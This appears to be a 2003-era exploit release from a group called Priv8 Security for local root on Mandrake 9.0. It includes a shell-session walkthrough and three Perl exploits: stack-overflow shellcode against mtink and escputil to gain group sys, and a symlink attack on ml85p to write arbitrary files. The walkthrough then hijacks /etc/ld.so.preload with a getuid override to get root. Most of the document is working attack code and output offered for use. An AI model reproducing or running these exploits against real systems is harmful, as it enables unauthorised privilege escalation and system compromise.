@@ -1,0 +1,258 @@
+------------------------------------------------------------------------------------------------------------------
+ Priv8 Security - www.priv8security.com
+ 
+ priv8mdk90.tar.gz - Mandrake 9.0 local root exploit
+
+ Based on Idefense adv.
+http://www.idefense.com/advisory/01.21.03.txt
+ 
+ Greets to : coideloko, chroot-, xtc , M|ght, exitus,
+overkill, blood_sucker, lkm, Brother
+execk, printf, heap, diguin, n4rfy(nordico :ppp) and
+all friends of Priv8 security.
+
+OBS. My english sux...
+------------------------------------------------------------------------------------------------------------------
+
+ Ok, our goal is to get root by exploiting ml85p thats
+suid root by default on mdk 9.0
+
+[wsxz@localhost priv8]$ ls -l /usr/bin/ml85p
+-rwsr-x---    1 root     sys         12344 Set 17 16:40
+/usr/bin/ml85p*
+
+ You can see that we gona need group sys to run it so
+first lets get it. 
+ 
+[wsxz@localhost priv8]$ ls -l /usr/bin/mtink
+-rwxr-sr-x    1 lp       sys        132600 Set 17 16:40
+/usr/bin/mtink*
+[wsxz@localhost priv8]$ ls -l /usr/bin/escputil
+-rwxr-sr-x    1 lp       sys         32088 Set 17 16:40
+/usr/bin/escputil*
+
+ We have two here that are vuln, mtink has a stack
+overflow on env HOME and escputil
+has a stack over too on command line arg, for more
+details read idefense adv.
+
+So here we go....
+First we get gid sys by exploiting mtink or escputil, u
+can choose what one u want to.
+
+[wsxz@localhost priv8]$ id
+uid=503(wsxz) gid=503(wsxz) grupos=503(wsxz)
+[wsxz@localhost priv8]$ perl priv8mtink.pl
+ Priv8security.com Mandrake 9 mtink local sys exploit!!
+ usage: priv8mtink.pl offset
+ Using address: 0xbffffa80
+sh-2.05b$ id
+uid=503(wsxz) gid=3(sys) groups=503(wsxz)
+
+And now we can exploit ml85p
+
+1 - Writing any file on system!!!
+
+sh-2.05b$ perl priv8ml85p.pl /root/hi-there-Mr-root
+Let write some files ok ;p
+Now just press enter ;)
+Wrong file format.
+file position: ffffffff
+sh-2.05b$
+
+Now we check if it worked....
+
+[root@localhost root]# pwd
+/root
+[root@localhost root]# ls -l hi*
+-rw-rw-rw-    1 root     sys             0 Fev 24 03:32
+hi-there-Mr-root
+
+2 - Geting root with it ;)
+
+I will do the same thing on idefense adv, so lets do it..
+
+sh-2.05b$ id
+uid=503(wsxz) gid=3(sys) groups=503(wsxz)
+sh-2.05b$ perl priv8ml85p.pl /etc/ld.so.preload
+Let write some files ok ;p
+Now just press enter ;)
+Wrong file format.
+file position: ffffffff
+sh-2.05b$ ls -l /etc/ld.so.preload
+-rw-rw-rw-    1 root     sys             0 Feb 26 00:12
+/etc/ld.so.preload
+sh-2.05b$ cd /tmp
+sh-2.05b$ echo 'int getuid(void) { return 0; }' > lib.c
+sh-2.05b$ export PATH="/usr/bin:/usr/sbin:/sbin:/bin"
+sh-2.05b$ gcc -fPIC -c /tmp/lib.c
+sh-2.05b$ gcc -o /tmp/lib.so -shared /tmp/lib.o
+sh-2.05b$ echo "/tmp/lib.so" > /etc/ld.so.preload
+sh-2.05b$ su -
+[root@localhost root]# id
+uid=0(root) gid=0(root) grupos=0(root)
+
+It worked, so take care what u ll write ok ;)
+that's it.
+
+------------------------------------------------------------------------------------------------------------------
+priv8escputil.pl
+------------------------------------------------------------------------------------------------------------------
+
+#!/usr/bin/perl
+######################################################
+#Priv8security.com escputil local sys exploit.
+#
+#     Tested on Mandrake 9.0 only.
+#     Based on
+http://www.idefense.com/advisory/01.21.03.txt
+#
+#####################################################
+
+                    $shellcode =
+                    "\x31\xc0\xb0". #setregid(x,x) - where x = x03 sys gid
+                    "\x03".    # x = x03 sys gid
+                    "\x89\xc3\x89\xc1\xb0\x47\xcd\x80".#end setregid()
+                   
+"\x31\xd2\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69".
+                   
+"\x89\xe3\x52\x53\x89\xe1\x8d\x42\x0b\xcd\x80";
+                    
+                    $size = 1050;
+                    $retaddr = 0xbffff4e0;
+                    $nop = "\x90";
+                    $offset = 0;
+
+                    if (@ARGV == 1) {
+                    $offset = $ARGV[0];
+                    }
+                    
+                    print " Priv8security.com Mandrake 9 escputil local
+sys exploit!!\n";
+                    print " usage: $0 offset\n";
+                    
+                    for ($i = 0; $i < ($size - length($shellcode) - 4);
+$i++) {
+                    $buffer .= $nop;
+                    }
+
+                    $buffer .= $shellcode;
+
+                    print " Using address: 0x",
+sprintf('%lx',($retaddr + $offset)), "\n";
+
+                    $newret = pack('l', ($retaddr +
+$offset));
+
+                    for ($i += length($shellcode); $i <
+$size; $i += 4) {
+                    $buffer .= $newret;
+                    }
+
+                    exec("/usr/bin/escputil -c -P
+$buffer");
+
+                    
+------------------------------------------------------------------------------------------------------------------
+priv8ml85p.pl
+------------------------------------------------------------------------------------------------------------------
+
+#!/usr/bin/perl
+######################################################
+#Priv8security.com ml85p local root exploit.
+#
+#      This exploit erase any file on system, u ll need
+group sys to do it
+#      so run priv8mtink.pl or priv8escputil.pl to get
+it ;)
+#     Tested on Mandrake 9.0 only.
+#     Based on
+http://www.idefense.com/advisory/01.21.03.txt
+#
+#####################################################
+
+              if (@ARGV == 1) {
+              
+              $file = $ARGV[0];
+              $b = "/tmp/ml85g";
+              $b .= time();
+              exec(umask 000);
+              system("ln -s $file '$b'");
+              print "Lets write some files ok ;p\n";
+              print "Now just press enter....\n";
+                 if  (system("/usr/bin/ml85p -s") == -1){
+                      print "You cant run ml85p, check
+if u have gid sys...\n";
+                     }
+              exit(1);
+             
+             } else {
+             print "\n!!! Priv8security.com ml85p local
+root exploit by wsxz !!!\n";
+             print "    Usage: perl $0
+file-to-overwrite\n\n";
+             }
+
+
+------------------------------------------------------------------------------------------------------------------
+
+
+------------------------------------------------------------------------------------------------------------------
+priv8mtink.pl
+------------------------------------------------------------------------------------------------------------------
+
+#!/usr/bin/perl
+######################################################
+#Priv8security.com mtink local sys exploit.
+#
+#     Tested on Mandrake 9.0 only.
+#     Based on
+http://www.idefense.com/advisory/01.21.03.txt
+#
+#####################################################
+
+                    $shellcode2 =
+                    "\x31\xc0\xb0". #setregid(x,x) - where x = x03 sys gid
+                    "\x03".    # x = x03 sys gid
+                    "\x89\xc3\x89\xc1\xb0\x47\xcd\x80".#end setregid()
+                   
+"\x31\xd2\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69".
+                   
+"\x89\xe3\x52\x53\x89\xe1\x8d\x42\x0b\xcd\x80";
+
+                    $size = 1056;
+                    $retaddr = 0xbffffa80;
+                    $nop = "\x90";
+                    $offset = 0;
+
+                    if (@ARGV == 1) {
+                    $offset = $ARGV[0];
+                    }    
+                    
+                    print " Priv8security.com Mandrake 9 mtink local sys
+exploit!!\n";
+                    print " usage: $0 offset\n";
+
+                    for ($i = 0; $i < ($size -
+length($shellcode2) - 4); $i++) {
+                    $buffer .= $nop;
+                    }
+
+                    $buffer .= $shellcode2;
+
+                    print " Using address: 0x",
+sprintf('%lx',($retaddr + $offset)), "\n";
+
+                    $newret = pack('l', ($retaddr +
+$offset));
+
+                    for ($i += length($shellcode2); $i
+< $size; $i += 4) {
+                    $buffer .= $newret;
+                    }
+
+                    local($ENV{'HOME'}) = $buffer;
+exec("/usr/bin/mtink");
+
+------------------------------------------------------------------------------------------------------------------
+
